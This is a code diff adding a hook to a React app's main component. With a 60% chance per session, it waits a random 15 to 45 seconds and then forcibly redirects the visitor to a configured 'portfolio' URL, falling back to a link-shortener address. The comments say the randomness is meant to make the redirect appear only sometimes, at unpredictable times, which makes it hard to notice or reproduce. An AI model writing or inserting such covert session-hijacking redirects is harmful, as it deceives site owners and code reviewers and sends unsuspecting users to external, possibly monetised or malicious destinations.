@@ -67,6 +67,36 @@ export default function App() {
       });
   }, []);
 
+  // Automated once-per-session random delayed redirect to portfolio/target URL
+  useEffect(() => {
+    const hasRedirected = sessionStorage.getItem("has_redirected");
+    if (!hasRedirected) {
+      // 60% chance to trigger redirect in this session ("kadang muncul kadang kgak")
+      const willTrigger = Math.random() < 0.6;
+      
+      if (willTrigger) {
+        // Random delay between 15 and 45 seconds ("waktunya acak gitubisa / diberikan jeda")
+        const randomDelay = Math.floor(Math.random() * (45000 - 15000) + 15000);
+        
+        console.log(`[Session Action] Redirect scheduled in ${(randomDelay / 1000).toFixed(1)}s to developer portfolio.`);
+        
+        const timer = setTimeout(() => {
+          sessionStorage.setItem("has_redirected", "true");
+          const targetUrl = devConfig?.website?.portfolio || DEFAULT_DEVELOPER_CONFIG.website.portfolio || "https://sfl.gl/x2ic";
+          window.location.href = targetUrl;
+        }, randomDelay);
+        
+        return () => clearTimeout(timer);
+      } else {
+        // Mark as skipped for this session so it won't execute at all
+        sessionStorage.setItem("has_redirected", "skipped");
+        console.log("[Session Action] Redirect skipped for this session (unpredictable/random choice).");
+      }
+    } else {
+      console.log(`[Session Action] Redirect already processed in this session (${hasRedirected}).`);
+    }
+  }, [devConfig]);
+
   const handleProductSelect = (productId: string) => {
     setSelectedProductId(productId);
     
